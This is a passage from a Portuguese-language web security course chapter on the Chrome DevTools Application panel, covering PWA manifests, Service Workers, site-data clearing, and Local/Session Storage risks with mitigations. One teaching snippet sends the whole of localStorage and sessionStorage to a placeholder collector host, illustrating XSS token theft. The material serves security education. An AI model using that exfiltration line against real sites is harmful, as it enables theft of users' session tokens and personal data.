> [⬅️ 2.1 Chrome DevTools — Aba Network](./02a-devtools-network.md) | [🏠 **Voltar ao Sumário Principal**](../README.md) | [2.3 Chrome DevTools — Aba Console ➡️](./02c-devtools-console.md)

---

<a id="s2-2"></a>
### 2.2 Application

O painel **Application** (anteriormente chamado de *Resources* em versões antigas do navegador) é o centro de comando do Chrome DevTools para inspecionar, modificar, depurar e auditar todo o **estado persistido ou gerenciado no lado do cliente** (*client-side state*). Enquanto a aba [Network](./02a-devtools-network.md#s2-1) foca nos dados **em trânsito** entre o navegador e os servidores sob os protocolos HTTP (*Hypertext Transfer Protocol* — Protocolo de Transferência de Hipertexto) e HTTPS (*HTTP over TLS* — HTTP sobre *Transport Layer Security*), a aba **Application** revela o que permanece **em repouso** (*data at rest*) no dispositivo do usuário e quais processos em segundo plano controlam o ciclo de vida da aplicação web.

Em uma auditoria de segurança da informação ou durante o desenvolvimento de uma SPA (*Single-Page Application* — Aplicação de Página Única) ou PWA (*Progressive Web App* — Aplicação Web Progressiva), a aba **Application** responde a perguntas críticas:
- Onde a aplicação está guardando tokens de autenticação, como um JWT (*JSON Web Token*, definido na RFC 7519) ou identificadores de sessão?
- Os cookies enviados pelo servidor possuem as flags de proteção exigidas (`HttpOnly`, `Secure`, `SameSite`) ou estão expostos a roubo via XSS (*Cross-Site Scripting* — Scripts entre Sites) e envio forçado via CSRF (*Cross-Site Request Forgery* — Falsificação de Requisição entre Sites)?
- Existem PII (*Personally Identifiable Information* — Informações de Identificação Pessoal, como CPF, e-mail, endereço ou dados médicos) gravadas em texto claro no disco do navegador em computadores potencialmente compartilhados?
- Há algum *Service Worker* interceptando requisições de rede ou mantendo respostas confidenciais armazenadas no *Cache Storage* mesmo após o usuário clicar em "Sair" (*logout*)?
- Como a página e seus *iframes* estão isolados em relação a políticas modernas de segurança, como COOP (*Cross-Origin-Opener-Policy*) e COEP (*Cross-Origin-Embedder-Policy*)?

##### Organização da barra lateral (Sidebar)

Ao abrir a aba **Application**, a interface é dividida em duas áreas principais: a **barra lateral esquerda** (*Sidebar*), que organiza os recursos em grupos hierárquicos expansíveis, e o **painel central/direito**, que exibe tabelas interativas, árvores de objetos ou controles de diagnóstico do item selecionado.

> [!NOTE]
> **[Varia por versão]** O Chrome atualiza periodicamente a organização da barra lateral do painel **Application** (notavelmente a partir das reformulações das versões 115 a 135+). Recursos ligados ao *Privacy Sandbox* (como *Shared Storage* e *Private State Tokens*) ou à especulação de carregamento (*Speculative Loads*) podem mudar de subgrupo ou depender de flags do navegador.

A barra lateral é estruturada nos seguintes grupos principais:

| Grupo na Barra Lateral | Subitens Principais | Finalidade Técnica e de Auditoria |
|---|---|---|
| **Application** | *Manifest*, *Service workers*, *Storage* | Inspecionar o manifesto da PWA, controlar *Service Workers* ativos, visualizar o consumo de disco por origem e apagar todos os dados do site (*Clear site data*). |
| **Storage** | *Local storage*, *Session storage*, *IndexedDB*, *Web SQL* (**[Obsoleto]**), *Cookies*, *Cache storage*, *Storage buckets* (**[Varia por versão]**), *Shared storage* (**[Varia por versão]**), *Private state tokens* (**[Varia por versão]**) | Auditar todos os mecanismos de persistência de dados no cliente separados por origem (*Origin*) ou chave de armazenamento (*Storage Key*). |
| **Background Services** | *Back/forward cache*, *Background fetch*, *Background sync*, *Notifications*, *Payment handler*, *Periodic background sync*, *Push messaging*, *Reporting API*, *Speculative loads* | Monitorar eventos assíncronos em segundo plano, testes de elegibilidade do cache de navegação instantânea (*bfcache*) e relatórios de violação da *Reporting API*. |
| **Frames** | Árvore de quadros (`top`, `<iframe>`), *Workers*, scripts, documentos e recursos por frame | Inspecionar o estado de isolamento de segurança (*Security & Isolation*), disponibilidade de APIs (*Application Programming Interfaces*) sensíveis como `SharedArrayBuffer` e hierarquia de documentos embutidos. |

---

<a id="s2-2-1"></a>
#### 2.2.1 Grupo Application

O primeiro grupo no topo da barra lateral reúne as configurações globais da aplicação instalada ou executada na origem atual: os metadados do *Web App Manifest*, o gerenciamento de *Service Workers* e o painel consolidado de limpeza e cotas de armazenamento (*Storage*).

##### Manifest

- **Nome do parâmetro**: **Manifest** (Visualizador do *Web App Manifest*).
- **O que significa**: exibe de forma estruturada o conteúdo do arquivo de manifesto da aplicação web (geralmente `manifest.json` ou `manifest.webmanifest`), vinculado ao HTML (*HyperText Markup Language*) por meio da tag `<link rel="manifest" href="/manifest.webmanifest">`.
- **Para que serve**: verificar as propriedades que permitem que um site funcione como uma PWA instalável no sistema operacional (SO) desktop ou móvel, incluindo nome (`name`, `short_name`), URL (*Uniform Resource Locator*) inicial (`start_url`), escopo de navegação (`scope`), modo de exibição (`display`: `standalone`, `fullscreen`, `minimal-ui`, `browser`), cores de tema, orientação, ícones (`icons`), capturas de tela e manipuladores de protocolo (`protocol_handlers`) ou arquivos (`file_handlers`).
- **Onde encontrar no DevTools**: aba **Application** → barra lateral esquerda → grupo **Application** → **Manifest**.
- **Exemplo prático**: ao inspecionar `https://loja-ficticia.test`, o painel **Manifest** exibe as seções *Identity*, *Presentation*, *Icons* e, quando aplicável, avisos de instalabilidade (*Installability*). O arquivo bruto correspondente seria:

```json
{
  "name": "Loja Fictícia Universitária",
  "short_name": "LojaFicticia",
  "start_url": "/?utm_source=pwa",
  "scope": "/",
  "display": "standalone",
  "background_color": "#ffffff",
  "theme_color": "#0d47a1",
  "icons": [
    {
      "src": "/assets/icon-192.png",
      "sizes": "192x192",
      "type": "image/png"
    }
  ]
}
```

- **Comportamento normal**: para sites que são PWAs, mostra todos os metadados preenchidos sem alertas de erro; para sites tradicionais que não declaram `<link rel="manifest">`, exibe a mensagem *"No manifest detected"*.
- **O que seria considerado seguro**:
  - **[RECOMENDAÇÃO]** Definir um `scope` restrito apenas aos caminhos que pertencem à aplicação.
  - **[REQUISITO]** Nunca incluir segredos, tokens de API, URLs de administração ocultas ou identificadores de sessão dentro do arquivo de manifesto ou na `start_url`, pois o manifesto é um arquivo estático público.
  - **[RECOMENDAÇÃO]** Caso a aplicação utilize `protocol_handlers` (registro de esquemas customizados como `web+loja://`) ou `file_handlers`, validar e sanitizar rigorosamente os argumentos recebidos antes de processá-los no DOM (*Document Object Model* — Modelo de Objetos de Documento).
- **O que poderia indicar uma vulnerabilidade**:
  - Presença de parâmetros sensíveis na `start_url` (ex.: `"start_url": "/painel?api_key=xyz987"`).
  - Manifesto carregado de uma CDN (*Content Delivery Network* — Rede de Distribuição de Conteúdo) de terceiros comprometida ou sem controle de integridade, capaz de alterar o `start_url` ou registrar `protocol_handlers` maliciosos.
  - Uso do modo `display: "fullscreen"` ou `"standalone"` combinado com redirecionamentos abertos (*Open Redirect*) para tentar simular interfaces de login de terceiros sem exibir a barra de endereços do navegador (mitigado pelos navegadores modernos, que exibem a barra de URL ao sair do `scope`).
- **Como investigar o problema**: abra **Application → Manifest**, clique no link do arquivo de manifesto no topo do painel para abri-lo na aba **Sources** (ou inspecione a requisição com filtro `Manifest` na aba [Network](./02a-devtools-network.md#s2-1)), e verifique `start_url`, `scope`, `share_target`, `protocol_handlers` e os cabeçalhos HTTP de cache e CORS.
- **Como corrigir ou prevenir**: manter o `manifest.webmanifest` enxuto, estático e livre de dados dinâmicos de sessão **[REQUISITO]**; restringir `scope` ao diretório exato da aplicação **[BOA PRÁTICA]**; validar todas as entradas recebidas via *Web Share Target API* ou *Protocol Handlers* contra XSS **[REQUISITO]**.

##### Service Workers

- **Nome do parâmetro**: **Service Workers** (Painel de inspeção e controle de *Service Workers*).
- **O que significa**: um *Service Worker* (SW) é um script JavaScript especializado que o navegador executa em segundo plano, em uma *thread* separada da página principal (um *Worker context* sem acesso direto ao DOM), atuando como um **proxy de rede programável** no lado do cliente para uma determinada origem e escopo (`scope`).
- **Para que serve**: o painel **Service Workers** no DevTools permite monitorar o **ciclo de vida** do SW (*Installing* → *Waiting to activate* → *Activated and is running* / *Stopped*), identificar o arquivo-fonte (`Source`), ver quando ele foi recebido (*Received*), inspecionar clientes controlados (*Clients*) e acionar controles de depuração e simulação:
  - **Offline**: caixa de seleção que desconecta a aba da rede para testar o comportamento offline do SW.
  - **Update on reload**: força o navegador a buscar uma nova versão do script do SW e ativá-la imediatamente a cada recarregamento da página, ignorando a espera padrão de fechamento das abas.
  - **Bypass for network**: faz o navegador ignorar o *Service Worker* ativo e buscar todos os recursos diretamente na rede — essencial para isolar se um bug ou falha de segurança vem do SW ou do servidor real.
  - **Show all** (ou *Service workers from other origins*): lista todos os *Service Workers* registrados no navegador, mesmo de outros domínios.
  - **Update**: força manualmente uma verificação de atualização do script no servidor.
  - **Unregister**: remove imediatamente o registro do *Service Worker* daquela origem.
  - **Push / Sync / Periodic Sync**: campos de texto e botões para disparar eventos sintéticos de teste no *Service Worker*.
- **Onde encontrar no DevTools**: aba **Application** → barra lateral esquerda → grupo **Application** → **Service workers**.
- **Exemplo prático**: ao inspecionar `https://loja-ficticia.test`, você vê `sw.js` com Status `#42 activated and is running`. Ao marcar **Bypass for network** e recarregar a página, as requisições na aba [Network](./02a-devtools-network.md#s2-1) deixam de exibir o ícone de engrenagem e o status `(from service worker)`.
- **Comportamento normal**:
  - Por exigência de segurança da especificação W3C (*World Wide Web Consortium*), *Service Workers* **só podem ser registrados em contextos seguros** (`https://` ou `http://localhost` para desenvolvimento).
  - Seu ciclo de vida compreende três fases principais:
    1. **Registration & Installation (`install`)**: a página chama `navigator.serviceWorker.register('/sw.js')`; o SW baixa e tipicamente pré-armazena ativos estáticos no *Cache Storage*.
    2. **Waiting / Activation (`activate`)**: se já houver um SW antigo controlando abas abertas, o novo SW fica em estado *waiting* (a menos que execute `self.skipWaiting()`). Na ativação, costuma limpar caches antigos.
    3. **Controlling / Fetching (`fetch`, `push`, `sync`)**: uma vez ativo, intercepta todas as requisições de rede dentro do seu `scope` por meio do evento `fetch` e pode responder com `event.respondWith(...)`.
- **O que seria considerado seguro**:
  - **[REQUISITO]** Servir o arquivo do *Service Worker* (`sw.js`) exclusivamente via HTTPS e com cabeçalhos HTTP que impeçam cacheamento prolongado indevido do próprio script (o navegador já aplica limite máximo de 24h ao verificar atualizações de `sw.js`, mas `Cache-Control: no-cache` no arquivo `/sw.js` garante atualização imediata em caso de incidente).
  - **[REQUISITO]** Garantir que o endpoint que serve o `sw.js` não permita injeção de conteúdo controlado pelo usuário (como parâmetros JSONP — *JSON with Padding* — ou uploads de arquivos na mesma origem).
  - **[RECOMENDAÇÃO]** Restringir o interceptador `fetch` para nunca armazenar em cache respostas de APIs autenticadas ou páginas com dados pessoais.
- **O que poderia indicar uma vulnerabilidade**:
  - **Persistência de XSS (SW Hijacking)**: se uma aplicação possui um endpoint na mesma origem que reflete código JavaScript arbitrário (por exemplo, um endpoint JSONP antigo `/api/callback?cb=importScripts(...)` ou upload de arquivo `.js` no mesmo domínio) e também possui uma vulnerabilidade de XSS, um atacante pode registrar um *Service Worker* malicioso. Mesmo que o XSS original seja corrigido na página HTML, o *Service Worker* continuará ativo no navegador da vítima, interceptando todas as requisições e respostas futuras!
  - **Interferência após logout**: um SW que continua servindo páginas de painel administrativo a partir do cache mesmo após o usuário encerrar a sessão.
  - **Service Worker órfão ou quebrado**: um SW em loop de erro ou servindo ativos desatualizados com vulnerabilidades conhecidas no front-end.
- **Como investigar o problema**:
  1. Em **Application → Service workers**, verifique se existe um SW registrado para a origem, qual é o caminho em **Source** e qual o seu **Scope**.
  2. Clique no link do arquivo em **Source** (ex.: `sw.js`) para ler seu código-fonte na aba **Sources** e inspecionar o tratador `self.addEventListener('fetch', ...)`.
  3. Marque **Bypass for network** para comparar a resposta direta do servidor com a resposta entregue pelo SW.
  4. Marque **Show all** para verificar se há *Service Workers* suspeitos registrados em outras origens no navegador de teste.
- **Como corrigir ou prevenir**:
  - **[REQUISITO]** Jamais permitir que arquivos enviados por usuários sejam servidos na mesma origem/domínio principal da aplicação (use um domínio isolado para conteúdo estático de usuários, como `arquivos-usuarios.exemplo.test`) para impedir o registro de SW malicioso.
  - **[RECOMENDAÇÃO]** Utilizar o cabeçalho de resposta HTTP `Service-Worker-Allowed` apenas com escopos estritamente necessários.
  - **[BOA PRÁTICA]** Implementar um mecanismo de "botão de emergência" (*kill switch*) ou enviar `Clear-Site-Data: "storage", "cache"` para desregistrar *Service Workers* defeituosos ou comprometidos no logout.

> [!CAUTION]
> Um *Service Worker* comprometido na origem da aplicação tem poder equivalente a um proxy *Man-in-the-Middle* (MitM — Homem no Meio) dentro do próprio navegador para todas as páginas dentro do seu `scope`: ele pode ler cabeçalhos e corpos de requisições `fetch`, fabricar respostas HTML/JSON falsas e persistir por tempo indeterminado até ser explicitamente desregistrado ou substituído.

##### Storage (Clear Storage / Clear site data)

- **Nome do parâmetro**: **Storage** (Painel de visão geral de cotas e limpeza de dados do site, historicamente chamado de *Clear storage*).
- **O que significa**: é o painel consolidado que exibe o volume total de armazenamento em disco consumido pela origem atual (em bytes/KB/MB), discriminado por tecnologia (*Cookies*, *Local and session storage*, *IndexedDB*, *Cache storage*, *Service workers*), além de oferecer controles para simular cotas de disco e apagar seletivamente ou integralmente todos os dados locais do site.
- **Para que serve**:
  - Auditar rapidamente quanto espaço a aplicação ocupa no dispositivo do usuário e em quais mecanismos os dados estão concentrados (por meio de um gráfico de rosca/pizza colorido).
  - **Clear site data**: botão que apaga instantaneamente os dados selecionados nos checkboxes da seção *Usage* (*Unregister service workers*, *Local and session storage*, *IndexedDB*, *Web SQL*, *Cookies*, *Cache storage*), incluindo ou não cookies de terceiros (*including third-party cookies*).
  - **Simulate custom storage quota**: caixa de seleção que permite definir um limite artificial de armazenamento (em MB) via API `navigator.storage.estimate()`, útil para testar se a aplicação trata corretamente erros de disco cheio (`QuotaExceededError`).
- **Onde encontrar no DevTools**: aba **Application** → barra lateral esquerda → grupo **Application** → **Storage**.
- **Exemplo prático**: durante um teste de segurança em `https://loja-ficticia.test`, você faz login, navega pelo painel de pedidos e depois clica no botão "Sair" da aplicação. Em seguida, abre **Application → Storage** e observa que o gráfico ainda indica `14.2 MB` usados em *Cache storage* e `120 KB` em *IndexedDB*. Isso revela que o fluxo de logout da aplicação **não limpou** os bancos de dados locais do navegador.
- **Comportamento normal**: aplicações públicas leves consomem poucos kilobytes (apenas alguns cookies e preferências em *Local Storage*). Aplicações offline-first ou PWAs podem armazenar dezenas de megabytes em *Cache Storage* e *IndexedDB* dentro da cota padrão concedida pelo navegador (que no Chrome pode chegar a até 60% do espaço em disco para uma origem).
- **O que seria considerado seguro**:
  - **[REQUISITO]** No encerramento de sessão (*logout*), a aplicação deve limpar todo o estado sensível armazenado no cliente (cookies de sessão, *Local Storage*, *Session Storage*, *IndexedDB* e *Cache Storage* autenticado).
  - **[RECOMENDAÇÃO]** O servidor deve responder à requisição de `POST /logout` com o cabeçalho HTTP padronizado pelo W3C **`Clear-Site-Data`** (por exemplo: `Clear-Site-Data: "cache", "cookies", "storage"`), instruindo o próprio navegador a executar de forma nativa e atômica a mesma limpeza que o botão **Clear site data** realiza manualmente no DevTools.
- **O que poderia indicar uma vulnerabilidade**:
  - Consumo elevado em *IndexedDB*, *Cache Storage* ou *Local Storage* que permanece intacto após o *logout*, mantendo faturas, mensagens privadas ou tokens acessíveis para o próximo usuário do computador.
  - Ausência de tratamento para `QuotaExceededError`, permitindo que um script ou atacante preencha a cota de armazenamento e cause negação de serviço (*Denial of Service* — DoS) lógica na interface do cliente.
- **Como investigar o problema**:
  1. Clique em **Clear site data** antes de iniciar o teste para garantir um estado inicial limpo (*clean slate*).
  2. Autentique-se na aplicação e execute operações que carreguem dados sensíveis.
  3. Faça *logout* pela interface normal da aplicação.
  4. Volte em **Application → Storage** e verifique se o uso de *IndexedDB*, *Cache storage* e *Local/session storage* caiu para zero (ou restaram apenas preferências públicas anônimas, como idioma/tema).
- **Como corrigir ou prevenir**:
  - No back-end, incluir o header `Clear-Site-Data` na rota de encerramento de sessão **[RECOMENDAÇÃO]**:

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Clear-Site-Data: "cache", "cookies", "storage"
Cache-Control: no-store
```

  - No front-end, executar explicitamente rotinas de limpeza no evento de *logout* (`localStorage.clear()`, `sessionStorage.clear()`, `indexedDB.deleteDatabase(...)` e `caches.delete(...)`) **[REQUISITO]**.

---

<a id="s2-2-2"></a>
#### 2.2.2 Visão geral do grupo Storage

O grupo **Storage** na barra lateral da aba **Application** agrupa todos os mecanismos de persistência de dados no navegador. Com a evolução da arquitetura web moderna e o endurecimento das proteções de privacidade contra rastreamento entre sites (*cross-site tracking*), o Chrome organiza esses armazenamentos não apenas por **Origem** (*Origin* = `esquema + host + porta`, conforme a SOP — *Same-Origin Policy* ou Política de Mesma Origem, veja [Fundamentos Web](./01a-fundamentos-web-parte1.md#s1)), mas também pelo conceito de **Storage Key** (Chave de Armazenamento / *Storage Partitioning*).

> [!IMPORTANT]
> **Particionamento de Armazenamento (*Storage Partitioning*)**: nos navegadores modernos, quando um site `https://parceiro.test` é embutido via `<iframe>` dentro de `https://loja-ficticia.test`, o seu `localStorage`, `indexedDB` e `Cache Storage` são **particionados** pela combinação `(top-level site, frame origin)`. Isso significa que os dados gravados pelo iframe de `parceiro.test` dentro de `loja-ficticia.test` ficam isolados e não podem ser lidos pelo mesmo iframe quando embutido em `https://outro-site.test`.

A tabela a seguir sintetiza as tecnologias inspecionáveis no grupo **Storage** do DevTools e seu perfil de segurança:

| Tecnologia no Grupo Storage | Formato de Dados | Escopo e Persistência | Acesso via JavaScript | Envio Automático na Rede | Uso Adequado vs. Risco de Segurança |
|---|---|---|---|---|---|
| **Local Storage** | Pares chave-valor (`string` → `string`) | Mesma origem (particionado); persiste até ser apagado | Sim (`window.localStorage`), síncrono | Não | **Adequado**: tema escuro, estado de UI (*User Interface*). **Risco**: totalmente vulnerável a roubo via XSS; nunca guardar senhas ou tokens de sessão. |
| **Session Storage** | Pares chave-valor (`string` → `string`) | Mesma origem + **mesma aba** (*top-level browsing context*); apaga ao fechar a aba | Sim (`window.sessionStorage`), síncrono | Não | **Adequado**: rascunho de formulário em etapas na aba atual. **Risco**: igualmente acessível via JavaScript em caso de XSS na página. |
| **IndexedDB** | Banco NoSQL transacional de objetos estruturados, `Blob`, `File`, `ArrayBuffer` | Mesma origem (particionado); persiste até ser apagado | Sim (`window.indexedDB`, inclusive em *Workers*), assíncrono | Não | **Adequado**: catálogos offline, grandes volumes de dados estruturados. **Risco**: acessível via XSS (na página ou *Service Worker*) e persiste em disco após fechar o navegador. |
| **Web SQL** (**[Obsoleto]**) | Banco relacional SQLite no cliente | Mesma origem | Removido do padrão web | Não | **[Obsoleto]** Especificação abandonada pelo W3C e removida do Chrome; substituída pelo *IndexedDB*. |
| **Cookies** | Pequenos pares chave-valor (`string`) com metadados/atributos | Definido por `Domain` + `Path` (e `Partition Key` com CHIPS); sessão ou data em `Expires`/`Max-Age` | Condicional: **bloqueado** para JS se tiver flag `HttpOnly` | **Sim**, em toda requisição HTTP compatível via header `Cookie` | **Adequado**: identificadores de sessão (`HttpOnly; Secure; SameSite`). **Risco**: sem `HttpOnly` sofre roubo via XSS; sem `SameSite`/token anti-CSRF sofre CSRF. |
| **Cache Storage** | Pares `Request` → `Response` HTTP completos | Mesma origem (particionado); persiste até ser apagado | Sim (`window.caches`, página e *Service Workers*), assíncrono | Não diretamente (interceptado pelo *Service Worker*) | **Adequado**: ativos estáticos (`.js`, `.css`, imagens, fontes). **Risco**: cachear respostas de APIs autenticadas expõe dados privados offline. |
| **Storage Buckets** (**[Varia por versão]**) | "Baldes" isolados contendo *IndexedDB* e *Cache Storage* com políticas próprias | Mesma origem | Sim (`navigator.storageBuckets`) | Não | Permite definir prioridades de expiração e cotas separadas para dados críticos vs. descartáveis. |
| **Shared Storage** (**[Varia por versão]**) | Armazenamento chave-valor entre sites com saída restrita (*Privacy Sandbox*) | Por origem, mas gravável cross-site | Escrita ampla; leitura restrita a *Worklets* isolados | Não | Projetado para substituir casos de uso legítimos de cookies de terceiros sem permitir rastreamento individual. |
| **Private State Tokens** (**[Varia por versão]**) | Tokens criptográficos cegos (*blind signatures*, antigo *Trust Tokens*) | Emissor → Redeemed em terceiros | API específica em `fetch()` / `<iframe>` | Via header `Sec-Private-State-Token` | Combate a fraude e bots entre sites sem expor a identidade real do usuário. |

---

<a id="s2-2-3"></a>
#### 2.2.3 Local Storage e Session Storage

Tanto o **Local Storage** quanto o **Session Storage** fazem parte da especificação **Web Storage API** do WHATWG (*Web Hypertext Application Technology Working Group*) e fornecem um mecanismo simples de dicionário chave-valor no navegador, onde **tanto as chaves quanto os valores são obrigatoriamente armazenados como strings UTF-16** (tipicamente cerca de **5 MB a 10 MB** por origem). Para aprofundamento conceitual sobre o funcionamento na arquitetura web, consulte também [Fundamentos Web](./01a-fundamentos-web-parte1.md#s1).

##### Diferenças detalhadas entre Local Storage e Session Storage

1. **Tempo de vida (Persistência)**:
   - **`localStorage`**: é **persistente**. Os dados sobrevivem ao recarregamento da página, ao fechamento da aba, ao encerramento do navegador e até à reinicialização do sistema operacional. Eles só desaparecem se forem removidos via código JavaScript (`localStorage.removeItem()` / `localStorage.clear()`), pelo usuário/DevTools, pelo cabeçalho HTTP `Clear-Site-Data: "storage"`, ou se o navegador limpar dados de sites inativos sob pressão extrema de disco.
   - **`sessionStorage`**: é **efêmero e vinculado à sessão da aba** (*top-level browsing context*). Os dados sobrevivem a recarregamentos da página (`F5`) e a navegações de ida e volta na mesma aba, mas são **destruídos imediatamente assim que a aba ou janela é fechada**.
2. **Isolamento entre abas**:
   - **`localStorage`**: é compartilhado simultaneamente por todas as abas e janelas abertas na mesma origem (no mesmo perfil de navegador). Uma alteração em uma aba dispara o evento `window.onstorage` nas demais abas da mesma origem.
   - **`sessionStorage`**: é **estritamente isolado por aba**. Se o usuário abrir duas abas para `https://loja-ficticia.test`, cada aba terá seu próprio `sessionStorage` independente (com a única nuance histórica de que duplicar uma aba ou abrir link com `window.open` na mesma origem pode clonar o estado inicial daquele instante, que passa a divergir dali em diante — comportamento inclusive restringido por `rel="noopener"`).

##### Como inspecionar, editar e remover pares chave-valor no DevTools

Ao expandir **Local storage** ou **Session storage** na barra lateral do grupo **Storage** e clicar na origem desejada (ex.: `https://loja-ficticia.test`), o painel central exibe uma tabela de duas colunas (**Key** e **Value**) acompanhada de uma barra de ferramentas no topo e um visualizador na parte inferior:
- **Filtrar pares**: use a caixa de texto **Filter** no topo para buscar substrings em chaves ou valores.
- **Visualizar objetos JSON formatados**: ao clicar em uma linha cujo valor é uma string JSON (ex.: `{"tema":"escuro","itens":3}`), a gaveta inferior do painel converte e exibe automaticamente a árvore JSON formatada e expansível, facilitando a auditoria de estruturas aninhadas.
- **Adicionar um novo par**: dê um duplo clique na linha vazia abaixo dos registros existentes e digite a nova chave e o novo valor.
- **Editar um par em tempo real**: dê um duplo clique sobre qualquer célula da coluna **Key** ou **Value**, altere o texto e pressione `Enter`. Isso permite testar na hora como o front-end reage a valores modificados (por exemplo, testar se mudar `"isAdmin": false` para `"isAdmin": true` no `localStorage` engana a interface do cliente).
- **Remover um par ou limpar tudo**: selecione a linha e clique no ícone de exclusão (`X` — *Delete Selected*) ou pressione a tecla `Delete`; para apagar todas as chaves da origem de uma só vez, clique no ícone de bloqueio/limpeza (*Clear All*) na barra superior da tabela.

##### Que tipos de dados podem ser armazenados com segurança?

O *Web Storage* (`localStorage` e `sessionStorage`) foi projetado exclusivamente para **estado de interface não sensível e preferências locais do cliente**, tais como:
- Preferência de tema visual (`theme = "dark"` ou `"light"`).
- Idioma selecionado na interface (`locale = "pt-BR"`).
- Estado de recolhimento de barras laterais, filtros de ordenação de tabelas ou avisos de *onboarding* já lidos (`banner_boas_vindas_fechado = "true"`).
- Rascunhos temporários de texto não confidencial ou identificadores de carrinho de compras **anônimo** (antes do login).

##### Por que NÃO é recomendado guardar senhas ou tokens sensíveis no Local/Session Storage?

**[REQUISITO]** **Senhas jamais devem ser armazenadas no navegador em `localStorage` ou `sessionStorage`** sob nenhuma hipótese. **[RECOMENDAÇÃO]** **Tokens de sessão, tokens de acesso (JWT) de longa duração e *Refresh Tokens* também não devem ser armazenados em `localStorage` ou `sessionStorage`** em aplicações que exigem segurança robusta. Os motivos técnicos são:

1. **Ausência de mecanismo equivalente ao `HttpOnly`**: diferentemente dos cookies HTTP, que possuem a flag `HttpOnly` capaz de torná-los completamente invisíveis ao motor JavaScript do navegador, **100% do conteúdo de `localStorage` e `sessionStorage` existe especificamente para ser lido por JavaScript**. Qualquer script executando naquela origem tem permissão total de leitura e escrita.
2. **Superfície de ataque amplificada em aplicações modernas**: uma aplicação web real raramente executa apenas o código escrito pela própria equipe; ela frequentemente carrega dezenas de pacotes NPM (*Node Package Manager*), scripts de *analytics*, widgets de chat de suporte, gerenciadores de tags (*Tag Managers*) e bibliotecas de terceiros. Se **qualquer um** desses scripts sofrer um ataque à cadeia de suprimentos (*Supply Chain Attack*) ou se houver **uma única** falha de XSS (Refletido, Armazenado ou DOM-based) em qualquer página da mesma origem, todo o `localStorage` e `sessionStorage` é instantaneamente comprometido.
3. **Persistência sem expiração nativa no `localStorage`**: o `localStorage` não possui atributo `Max-Age` ou `Expires` nativo. Um JWT ou dado pessoal salvo ali fica gravado em texto claro em arquivos SQLite/LevelDB no perfil do usuário no sistema operacional (`Local Storage/leveldb`), podendo ser extraído inclusive por malwares locais (*infostealers*) ou por outro usuário em um terminal compartilhado.

##### Como vulnerabilidades XSS leem `localStorage` e `sessionStorage` com uma linha de JavaScript

Em um ambiente autorizado de laboratório (como OWASP Juice Shop ou uma aplicação local de estudo), caso exista uma vulnerabilidade de XSS (por exemplo, um campo de busca que insere a entrada do usuário via `innerHTML` sem sanitização), um invasor não precisa ler chave por chave: o objeto `localStorage` inteiro pode ser serializado com `JSON.stringify(localStorage)` e exfiltrado com uma única linha de JavaScript.

**Exemplo didático (Laboratório Autorizado) — Exfiltração em uma linha vs. Mitigação:**

```javascript
// [LABORATÓRIO - IMPACTO DO XSS]
// Se a aplicação armazena 'auth_token' ou 'refresh_token' no localStorage/sessionStorage,
// qualquer código JS injetado na origem consegue capturar TUDO com uma única linha:
fetch('https://coletor-laboratorio.exemplo.test/log', {
  method: 'POST',
  body: JSON.stringify({
    local: localStorage,
    session: sessionStorage
  })
});
```

Para mitigar esse risco arquitetural:
- **[RECOMENDAÇÃO]** Armazenar identificadores de sessão e *Refresh Tokens* em **cookies HTTP com as flags `HttpOnly; Secure; SameSite=Lax` (ou `Strict`)**, tornando-os inacessíveis a `document.cookie` e a qualquer payload de XSS.
- **[BOA PRÁTICA]** Caso a arquitetura exija o uso de um *Access Token* (JWT) no front-end para chamadas de API, mantê-lo apenas em **memória volátil do JavaScript** (dentro de uma variável privada de módulo/closure, fora de `window`, `localStorage` e `sessionStorage`) com tempo de expiração muito curto (ex.: 5 a 15 minutos), renovado de forma transparente via cookie `HttpOnly` (padrão *BFF — Backend For Frontend* ou *Silent Refresh*).
- **[REQUISITO]** Prevenir XSS na origem utilizando codificação contextual de saída (`textContent` em vez de `innerHTML`), sanitização com bibliotecas como DOMPurify e uma política rigorosa de CSP (*Content Security Policy* — Política de Segurança de Conteúdo, veja [Headers de Segurança](./05-headers-de-seguranca.md#s5)).

##### Local Storage

- **Nome do parâmetro**: **Local Storage** (`window.localStorage`).
- **O que significa**: seção do grupo **Storage** que lista, por origem, todos os pares chave-valor (`string` → `string`) persistidos indefinidamente no navegador por meio da API `localStorage`.
- **Para que serve**: inspecionar, filtrar, adicionar, editar e excluir dados persistentes gravados por scripts da página atual ou de *iframes* embutidos.
- **Onde encontrar no DevTools**: aba **Application** → barra lateral esquerda → grupo **Storage** → expandir **Local storage** → clicar na origem (ex.: `https://loja-ficticia.test`).
- **Exemplo prático**:

```text
Key                     | Value
------------------------+------------------------------------------------
ui_theme                | "dark"
sidebar_collapsed       | "false"
```

- **Comportamento normal**: contém apenas chaves de configuração visual, cache leve de preferências não sensíveis ou flags de interface.
- **O que seria considerado seguro**: ausência total de credenciais, tokens de autenticação (`jwt`, `access_token`, `id_token`, `refresh_token`), chaves de API secretas, números de cartão ou PII. **[REQUISITO]** Não confiar em flags de controle de acesso salvas no `localStorage` (como `role: "admin"`), pois o usuário pode editá-las no DevTools.
- **O que poderia indicar uma vulnerabilidade**:
  - Chaves contendo strings no formato `eyJ...` (cabeçalho Base64URL típico de um JWT).
  - Objetos JSON contendo CPF, endereço, telefone, histórico financeiro ou hashes/senhas do usuário.
  - Flags de permissão (`"premium": true`, `"isAdmin": 1`) lidas pelo front-end sem validação correspondente no servidor.
- **Como investigar o problema**: abra **Application → Storage → Local storage**, selecione cada origem listada, examine todas as chaves e clique nas linhas para inspecionar o painel de visualização JSON inferior. Teste alterar valores de permissão dando duplo clique na célula **Value** para verificar se a aplicação libera funcionalidades indevidas sem consultar o back-end.
- **Como corrigir ou prevenir**: migrar tokens de sessão para cookies `HttpOnly; Secure; SameSite` **[RECOMENDAÇÃO]**; remover PII do armazenamento persistente no cliente **[REQUISITO]**; validar toda autorização exclusivamente no servidor **[REQUISITO]**.

##### Session Storage

- **Nome do parâmetro**: **Session Storage** (`window.sessionStorage`).
- **O que significa**: seção do grupo **Storage** que exibe os pares chave-valor vinculados temporariamente à origem e à aba atual do navegador.
- **Para que serve**: inspecionar e manipular dados transitórios que a aplicação mantém apenas enquanto a aba permanecer aberta (como o progresso de um assistente de cadastro em múltiplas etapas).
- **Onde encontrar no DevTools**: aba **Application** → barra lateral esquerda → grupo **Storage** → expandir **Session storage** → clicar na origem.
- **Exemplo prático**:

```text
Key                     | Value
------------------------+------------------------------------------------
checkout_step           | "2"
filtro_listagem_temp    | "{\"categoria\":\"livros\",\"ordem\":\"menor_preco\"}"
```

